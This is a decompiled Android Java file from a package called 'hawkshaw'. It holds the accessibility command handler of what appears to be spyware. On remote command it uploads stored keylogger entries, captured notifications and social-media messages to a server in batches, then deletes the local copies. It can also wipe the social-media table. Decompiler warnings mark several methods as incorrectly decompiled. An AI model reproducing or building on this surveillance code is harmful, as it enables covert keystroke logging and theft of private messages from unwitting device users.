package com.hawkshaw.library.features.accessibility;

import F3.b;
import W2.y;
import a3.e;
import android.content.Intent;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;

public final class HandlerKt {
    private static final String TAG = "AccessibilityHandler";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(13:0|1|2|3|4|5|6|7|8|9|10|11|13) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x002b */
        static {
            
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RunAccessibilityCommand     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilityKeylogger     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilityNotifications     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushAccessibilitySocialMedia     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.AccessibilityNukeSocialMediaDatabase     // Catch:{ NoSuchFieldError -> 0x0034 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                r2 = 5
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
            L_0x0034:
                $EnumSwitchMapping$0 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.WhenMappings.<clinit>():void");
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:10:0x001e, code lost:*/
        r3 = nukeSocialMediaDatabase(r4);
     
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object handleAccessibilityCommand(com.hawkshaw.library.datalayer.models.Command r3, a3.e r4) {
        
            com.hawkshaw.library.datalayer.models.Command$CommandType r0 = r3.getType()
            int[] r1 = com.hawkshaw.library.features.accessibility.HandlerKt.WhenMappings.$EnumSwitchMapping$0
            int r0 = r0.ordinal()
            r0 = r1[r0]
            r1 = 1
            W2.y r2 = W2.y.f2418a
            if (r0 == r1) goto L_0x0046
            r3 = 2
            if (r0 == r3) goto L_0x003c
            r3 = 3
            if (r0 == r3) goto L_0x0032
            r3 = 4
            if (r0 == r3) goto L_0x0028
            r3 = 5
            if (r0 == r3) goto L_0x001e
            goto L_0x004d
        L_0x001e:
            java.lang.Object r3 = nukeSocialMediaDatabase(r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x0027
            return r3
        L_0x0027:
            return r2
        L_0x0028:
            java.lang.Object r3 = pushSocialMedia(r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x0031
            return r3
        L_0x0031:
            return r2
        L_0x0032:
            java.lang.Object r3 = pushNotifications(r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x003b
            return r3
        L_0x003b:
            return r2
        L_0x003c:
            java.lang.Object r3 = pushKeyLogger(r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x0045
            return r3
        L_0x0045:
            return r2
        L_0x0046:
            com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest r3 = r3.getAccessibilityCommandRequest()
            runAccessibilityCommand(r3)
        L_0x004d:
            return r2
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.handleAccessibilityCommand(com.hawkshaw.library.datalayer.models.Command, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final Object nukeSocialMediaDatabase(e eVar) {
        Object nukeTable = AppDatabaseKt.getDb().socialMediaDao().nukeTable(eVar);
        return nukeTable == C0298a.f4140D ? nukeTable : y.f2418a;
    }

    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0050  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x0078  */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x0103  */
    /* JADX WARNING: Removed duplicated region for block: B:38:0x010c  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushKeyLogger(a3.e r14) {
        
            boolean r0 = r14 instanceof L1.c
            if (r0 == 0) goto L_0x0013
            r0 = r14
            L1.c r0 = (L1.c) r0
            int r1 = r0.f1151H
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1151H = r1
            goto L_0x0018
        L_0x0013:
            L1.c r0 = new L1.c
            r0.<init>(r14)
        L_0x0018:
            java.lang.Object r14 = r0.f1150G
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1151H
            r3 = 3
            r4 = 2
            r5 = 1
            if (r2 == 0) goto L_0x0050
            if (r2 == r5) goto L_0x004a
            if (r2 == r4) goto L_0x003a
            if (r2 != r3) goto L_0x0032
            java.util.Iterator r2 = r0.f1148E
            com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao r5 = r0.f1147D
            Y1.C0110h.P(r14)
            goto L_0x0104
        L_0x0032:
            java.lang.IllegalStateException r14 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r14.<init>(r0)
            throw r14
        L_0x003a:
            java.util.List r2 = r0.f1149F
            java.util.List r2 = (java.util.List) r2
            java.util.Iterator r5 = r0.f1148E
            com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao r6 = r0.f1147D
            Y1.C0110h.P(r14)
            r13 = r5
            r5 = r2
            r2 = r13
            goto L_0x00c9
        L_0x004a:
            com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao r2 = r0.f1147D
            Y1.C0110h.P(r14)
            goto L_0x0066
        L_0x0050:
            Y1.C0110h.P(r14)
            com.hawkshaw.library.datalayer.room.AppDatabase r14 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.keylogger.KeyLoggerDao r2 = r14.keyLoggerDao()
            r0.f1147D = r2
            r0.f1151H = r5
            java.lang.Object r14 = r2.getAll(r0)
            if (r14 != r1) goto L_0x0066
            return r1
        L_0x0066:
            java.util.List r14 = (java.util.List) r14
            java.lang.Iterable r14 = (java.lang.Iterable) r14
            java.util.ArrayList r14 = X2.o.O0(r14)
            java.util.Iterator r14 = r14.iterator()
        L_0x0072:
            boolean r5 = r14.hasNext()
            if (r5 == 0) goto L_0x010c
            java.lang.Object r5 = r14.next()
            java.util.List r5 = (java.util.List) r5
            com.hawkshaw.library.datalayer.Injector$Companion r6 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r6 = r6.getInstance()
            com.hawkshaw.library.datalayer.network.service.AccessibilityService r6 = r6.getAccessibilityService()
            r7 = r5
            java.lang.Iterable r7 = (java.lang.Iterable) r7
            java.util.ArrayList r8 = new java.util.ArrayList
            r9 = 10
            int r9 = X2.l.L0(r7, r9)
            r8.<init>(r9)
            java.util.Iterator r7 = r7.iterator()
        L_0x009a:
            boolean r9 = r7.hasNext()
            if (r9 == 0) goto L_0x00ae
            java.lang.Object r9 = r7.next()
            com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity r9 = (com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity) r9
            com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest$KeyLog r9 = com.hawkshaw.library.datalayer.models.accessibility.KeyLogKt.toRequest(r9)
            r8.add(r9)
            goto L_0x009a
        L_0x00ae:
            com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest r7 = new com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest
            r7.<init>(r8)
            r0.f1147D = r2
            r0.f1148E = r14
            r8 = r5
            java.util.List r8 = (java.util.List) r8
            r0.f1149F = r8
            r0.f1151H = r4
            java.lang.Object r6 = r6.pushKeyLogs(r7, r0)
            if (r6 != r1) goto L_0x00c5
            return r1
        L_0x00c5:
            r13 = r2
            r2 = r14
            r14 = r6
            r6 = r13
        L_0x00c9:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r14 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r14
            com.hawkshaw.library.logger.Logger r7 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r8 = r14.getState()
            java.lang.String r9 = "PushKeyLogger: "
            java.lang.String r9 = i.C0528x.h(r9, r8)
            java.lang.String r8 = "AccessibilityHandler"
            r10 = 0
            r11 = 4
            r12 = 0
            com.hawkshaw.library.logger.Logger.d$default(r7, r8, r9, r10, r11, r12)
            boolean r14 = r14 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r14 == 0) goto L_0x0108
            java.util.Collection r5 = (java.util.Collection) r5
            r14 = 0
            com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity[] r14 = new com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity[r14]
            java.lang.Object[] r14 = r5.toArray(r14)
            com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity[] r14 = (com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity[]) r14
            int r5 = r14.length
            java.lang.Object[] r14 = java.util.Arrays.copyOf(r14, r5)
            r0.f1147D = r6
            r0.f1148E = r2
            r5 = 0
            r0.f1149F = r5
            r0.f1151H = r3
            java.lang.Object r14 = r6.deleteAll(r14, r0)
            if (r14 != r1) goto L_0x0103
            return r1
        L_0x0103:
            r5 = r6
        L_0x0104:
            r14 = r2
            r2 = r5
            goto L_0x0072
        L_0x0108:
            r14 = r2
            r2 = r6
            goto L_0x0072
        L_0x010c:
            W2.y r14 = W2.y.f2418a
            return r14
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.pushKeyLogger(a3.e):java.lang.Object");
    }

    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0050  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x0078  */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x0105  */
    /* JADX WARNING: Removed duplicated region for block: B:38:0x010e  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushNotifications(a3.e r14) {
        
            boolean r0 = r14 instanceof L1.d
            if (r0 == 0) goto L_0x0013
            r0 = r14
            L1.d r0 = (L1.d) r0
            int r1 = r0.f1156H
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1156H = r1
            goto L_0x0018
        L_0x0013:
            L1.d r0 = new L1.d
            r0.<init>(r14)
        L_0x0018:
            java.lang.Object r14 = r0.f1155G
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1156H
            r3 = 3
            r4 = 2
            r5 = 1
            if (r2 == 0) goto L_0x0050
            if (r2 == r5) goto L_0x004a
            if (r2 == r4) goto L_0x003a
            if (r2 != r3) goto L_0x0032
            java.util.Iterator r2 = r0.f1153E
            com.hawkshaw.library.datalayer.room.notification.NotificationDao r5 = r0.f1152D
            Y1.C0110h.P(r14)
            goto L_0x0106
        L_0x0032:
            java.lang.IllegalStateException r14 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r14.<init>(r0)
            throw r14
        L_0x003a:
            java.util.List r2 = r0.f1154F
            java.util.List r2 = (java.util.List) r2
            java.util.Iterator r5 = r0.f1153E
            com.hawkshaw.library.datalayer.room.notification.NotificationDao r6 = r0.f1152D
            Y1.C0110h.P(r14)
            r13 = r5
            r5 = r2
            r2 = r13
            goto L_0x00c9
        L_0x004a:
            com.hawkshaw.library.datalayer.room.notification.NotificationDao r2 = r0.f1152D
            Y1.C0110h.P(r14)
            goto L_0x0066
        L_0x0050:
            Y1.C0110h.P(r14)
            com.hawkshaw.library.datalayer.room.AppDatabase r14 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.notification.NotificationDao r2 = r14.notificationDao()
            r0.f1152D = r2
            r0.f1156H = r5
            java.lang.Object r14 = r2.getAll(r0)
            if (r14 != r1) goto L_0x0066
            return r1
        L_0x0066:
            java.util.List r14 = (java.util.List) r14
            java.lang.Iterable r14 = (java.lang.Iterable) r14
            java.util.ArrayList r14 = X2.o.O0(r14)
            java.util.Iterator r14 = r14.iterator()
        L_0x0072:
            boolean r5 = r14.hasNext()
            if (r5 == 0) goto L_0x010e
            java.lang.Object r5 = r14.next()
            java.util.List r5 = (java.util.List) r5
            com.hawkshaw.library.datalayer.Injector$Companion r6 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r6 = r6.getInstance()
            com.hawkshaw.library.datalayer.network.service.AccessibilityService r6 = r6.getAccessibilityService()
            r7 = r5
            java.lang.Iterable r7 = (java.lang.Iterable) r7
            java.util.ArrayList r8 = new java.util.ArrayList
            r9 = 10
            int r9 = X2.l.L0(r7, r9)
            r8.<init>(r9)
            java.util.Iterator r7 = r7.iterator()
        L_0x009a:
            boolean r9 = r7.hasNext()
            if (r9 == 0) goto L_0x00ae
            java.lang.Object r9 = r7.next()
            com.hawkshaw.library.datalayer.room.notification.NotificationEntity r9 = (com.hawkshaw.library.datalayer.room.notification.NotificationEntity) r9
            com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest$Notification r9 = com.hawkshaw.library.datalayer.models.accessibility.NotificationKt.toRequest(r9)
            r8.add(r9)
            goto L_0x009a
        L_0x00ae:
            com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest r7 = new com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest
            r7.<init>(r8)
            r0.f1152D = r2
            r0.f1153E = r14
            r8 = r5
            java.util.List r8 = (java.util.List) r8
            r0.f1154F = r8
            r0.f1156H = r4
            java.lang.Object r6 = r6.pushNotifications(r7, r0)
            if (r6 != r1) goto L_0x00c5
            return r1
        L_0x00c5:
            r13 = r2
            r2 = r14
            r14 = r6
            r6 = r13
        L_0x00c9:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r14 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r14
            com.hawkshaw.library.logger.Logger r7 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r8 = r14.getState()
            java.lang.String r9 = "PushNotifications: "
            java.lang.String r9 = i.C0528x.h(r9, r8)
            java.lang.String r8 = "AccessibilityHandler"
            r10 = 0
            r11 = 4
            r12 = 0
            com.hawkshaw.library.logger.Logger.d$default(r7, r8, r9, r10, r11, r12)
            boolean r14 = r14.isSuccess()
            if (r14 == 0) goto L_0x010a
            java.util.Collection r5 = (java.util.Collection) r5
            r14 = 0
            com.hawkshaw.library.datalayer.room.notification.NotificationEntity[] r14 = new com.hawkshaw.library.datalayer.room.notification.NotificationEntity[r14]
            java.lang.Object[] r14 = r5.toArray(r14)
            com.hawkshaw.library.datalayer.room.notification.NotificationEntity[] r14 = (com.hawkshaw.library.datalayer.room.notification.NotificationEntity[]) r14
            int r5 = r14.length
            java.lang.Object[] r14 = java.util.Arrays.copyOf(r14, r5)
            r0.f1152D = r6
            r0.f1153E = r2
            r5 = 0
            r0.f1154F = r5
            r0.f1156H = r3
            java.lang.Object r14 = r6.deleteAll(r14, r0)
            if (r14 != r1) goto L_0x0105
            return r1
        L_0x0105:
            r5 = r6
        L_0x0106:
            r14 = r2
            r2 = r5
            goto L_0x0072
        L_0x010a:
            r14 = r2
            r2 = r6
            goto L_0x0072
        L_0x010e:
            W2.y r14 = W2.y.f2418a
            return r14
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.pushNotifications(a3.e):java.lang.Object");
    }

    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0042  */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x005e A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x0073  */
    /* JADX WARNING: Removed duplicated region for block: B:38:0x00db  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushSocialMedia(a3.e r11) {
        
            boolean r0 = r11 instanceof L1.e
            if (r0 == 0) goto L_0x0013
            r0 = r11
            L1.e r0 = (L1.e) r0
            int r1 = r0.f1160G
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1160G = r1
            goto L_0x0018
        L_0x0013:
            L1.e r0 = new L1.e
            r0.<init>(r11)
        L_0x0018:
            java.lang.Object r11 = r0.f1159F
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1160G
            r3 = 1
            r4 = 3
            r5 = 2
            if (r2 == 0) goto L_0x0042
            if (r2 == r3) goto L_0x003e
            if (r2 == r5) goto L_0x003a
            if (r2 != r4) goto L_0x0032
            int r2 = r0.f1157D
            java.util.Iterator r3 = r0.f1158E
            Y1.C0110h.P(r11)
            goto L_0x00bf
        L_0x0032:
            java.lang.IllegalStateException r11 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r11.<init>(r0)
            throw r11
        L_0x003a:
            Y1.C0110h.P(r11)
            goto L_0x005f
        L_0x003e:
            Y1.C0110h.P(r11)
            goto L_0x004e
        L_0x0042:
            Y1.C0110h.P(r11)
            r0.f1160G = r3
            java.lang.Object r11 = pushUnprocessedSocialMedia(r0)
            if (r11 != r1) goto L_0x004e
            return r1
        L_0x004e:
            com.hawkshaw.library.datalayer.room.AppDatabase r11 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaDao r11 = r11.socialMediaDao()
            r0.f1160G = r5
            java.lang.Object r11 = r11.getAll(r0)
            if (r11 != r1) goto L_0x005f
            return r1
        L_0x005f:
            java.util.List r11 = (java.util.List) r11
            java.lang.Iterable r11 = (java.lang.Iterable) r11
            java.util.ArrayList r11 = X2.o.O0(r11)
            java.util.Iterator r11 = r11.iterator()
            r2 = 0
            r3 = r11
        L_0x006d:
            boolean r11 = r3.hasNext()
            if (r11 == 0) goto L_0x00db
            java.lang.Object r11 = r3.next()
            int r5 = r2 + 1
            if (r2 < 0) goto L_0x00d6
            java.util.List r11 = (java.util.List) r11
            com.hawkshaw.library.datalayer.Injector$Companion r6 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r6 = r6.getInstance()
            com.hawkshaw.library.datalayer.network.service.AccessibilityService r6 = r6.getAccessibilityService()
            java.lang.Iterable r11 = (java.lang.Iterable) r11
            java.util.ArrayList r7 = new java.util.ArrayList
            r8 = 10
            int r8 = X2.l.L0(r11, r8)
            r7.<init>(r8)
            java.util.Iterator r11 = r11.iterator()
        L_0x0098:
            boolean r8 = r11.hasNext()
            if (r8 == 0) goto L_0x00ac
            java.lang.Object r8 = r11.next()
            com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity r8 = (com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity) r8
            com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest$SocialMediaMessage r8 = com.hawkshaw.library.datalayer.models.accessibility.SocialMediaKt.toRequest((com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity) r8)
            r7.add(r8)
            goto L_0x0098
        L_0x00ac:
            com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest r11 = new com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest
            r11.<init>(r2, r7)
            r0.f1158E = r3
            r0.f1157D = r5
            r0.f1160G = r4
            java.lang.Object r11 = r6.pushSocialMedia(r11, r0)
            if (r11 != r1) goto L_0x00be
            return r1
        L_0x00be:
            r2 = r5
        L_0x00bf:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r11 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r11
            com.hawkshaw.library.logger.Logger r5 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r11 = r11.getState()
            java.lang.String r6 = "PushSocialMedia: "
            java.lang.String r7 = i.C0528x.h(r6, r11)
            java.lang.String r6 = "AccessibilityHandler"
            r8 = 0
            r9 = 4
            r10 = 0
            com.hawkshaw.library.logger.Logger.d$default(r5, r6, r7, r8, r9, r10)
            goto L_0x006d
        L_0x00d6:
            Y1.K.z0()
            r11 = 0
            throw r11
        L_0x00db:
            W2.y r11 = W2.y.f2418a
            return r11
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.pushSocialMedia(a3.e):java.lang.Object");
    }

    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r0v12, resolved type: java.lang.Object} */
    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r3v6, resolved type: java.util.List} */
    /* JADX WARNING: type inference failed for: r1v3, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0046  */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x006e  */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x00c2  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x010b  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0027  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushUnprocessedSocialMedia(a3.e r22) {
        
            r0 = r22
            boolean r1 = r0 instanceof L1.f
            if (r1 == 0) goto L_0x0015
            r1 = r0
            L1.f r1 = (L1.f) r1
            int r2 = r1.f1165H
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f1165H = r2
            goto L_0x001a
        L_0x0015:
            L1.f r1 = new L1.f
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f1164G
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f1165H
            r4 = 10
            r5 = 0
            r6 = 2
            r7 = 1
            if (r3 == 0) goto L_0x0046
            if (r3 == r7) goto L_0x0040
            if (r3 != r6) goto L_0x0038
            java.util.List r3 = r1.f1163F
            java.util.List r3 = (java.util.List) r3
            java.util.Iterator r7 = r1.f1162E
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao r8 = r1.f1161D
            Y1.C0110h.P(r0)
            goto L_0x00ba
        L_0x0038:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0040:
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao r3 = r1.f1161D
            Y1.C0110h.P(r0)
            goto L_0x005c
        L_0x0046:
            Y1.C0110h.P(r0)
            com.hawkshaw.library.datalayer.room.AppDatabase r0 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao r3 = r0.unprocessedSocialMediaDao()
            r1.f1161D = r3
            r1.f1165H = r7
            java.lang.Object r0 = r3.list(r5, r1)
            if (r0 != r2) goto L_0x005c
            return r2
        L_0x005c:
            java.lang.Iterable r0 = (java.lang.Iterable) r0
            java.util.ArrayList r0 = X2.o.O0(r0)
            java.util.Iterator r0 = r0.iterator()
            r7 = r0
            r8 = r3
        L_0x0068:
            boolean r0 = r7.hasNext()
            if (r0 == 0) goto L_0x010b
            java.lang.Object r0 = r7.next()
            r3 = r0
            java.util.List r3 = (java.util.List) r3
            com.hawkshaw.library.datalayer.Injector$Companion r0 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r0 = r0.getInstance()
            com.hawkshaw.library.datalayer.network.service.AccessibilityService r0 = r0.getAccessibilityService()
            r9 = r3
            java.lang.Iterable r9 = (java.lang.Iterable) r9
            java.util.ArrayList r10 = new java.util.ArrayList
            int r11 = X2.l.L0(r9, r4)
            r10.<init>(r11)
            java.util.Iterator r9 = r9.iterator()
        L_0x008f:
            boolean r11 = r9.hasNext()
            if (r11 == 0) goto L_0x00a3
            java.lang.Object r11 = r9.next()
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity r11 = (com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity) r11
            com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest$UnprocessedSocialMediaMessage r11 = com.hawkshaw.library.datalayer.models.accessibility.SocialMediaKt.toRequest((com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity) r11)
            r10.add(r11)
            goto L_0x008f
        L_0x00a3:
            com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest r9 = new com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest
            r9.<init>(r10)
            r1.f1161D = r8
            r1.f1162E = r7
            r10 = r3
            java.util.List r10 = (java.util.List) r10
            r1.f1163F = r10
            r1.f1165H = r6
            java.lang.Object r0 = r0.pushUnprocessedSocialMedia(r9, r1)
            if (r0 != r2) goto L_0x00ba
            return r2
        L_0x00ba:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r0 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r0
            boolean r0 = r0.isSuccess()
            if (r0 == 0) goto L_0x0068
            java.lang.Iterable r3 = (java.lang.Iterable) r3
            java.util.ArrayList r0 = new java.util.ArrayList
            int r9 = X2.l.L0(r3, r4)
            r0.<init>(r9)
            java.util.Iterator r3 = r3.iterator()
        L_0x00d1:
            boolean r9 = r3.hasNext()
            if (r9 == 0) goto L_0x00f7
            java.lang.Object r9 = r3.next()
            r10 = r9
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity r10 = (com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity) r10
            r18 = 0
            r19 = 1
            r11 = 0
            r12 = 0
            r13 = 0
            r14 = 0
            r15 = 0
            r16 = 0
            r17 = 0
            r20 = 255(0xff, float:3.57E-43)
            r21 = 0
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity r9 = com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity.copy$default(r10, r11, r12, r13, r14, r15, r16, r17, r18, r19, r20, r21)
            r0.add(r9)
            goto L_0x00d1
        L_0x00f7:
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[] r3 = new com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[r5]
            java.lang.Object[] r0 = r0.toArray(r3)
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[] r0 = (com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[]) r0
            int r3 = r0.length
            java.lang.Object[] r0 = java.util.Arrays.copyOf(r0, r3)
            com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[] r0 = (com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity[]) r0
            r8.insertSync(r0)
            goto L_0x0068
        L_0x010b:
            W2.y r0 = W2.y.f2418a
            return r0
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.HandlerKt.pushUnprocessedSocialMedia(a3.e):java.lang.Object");
    }

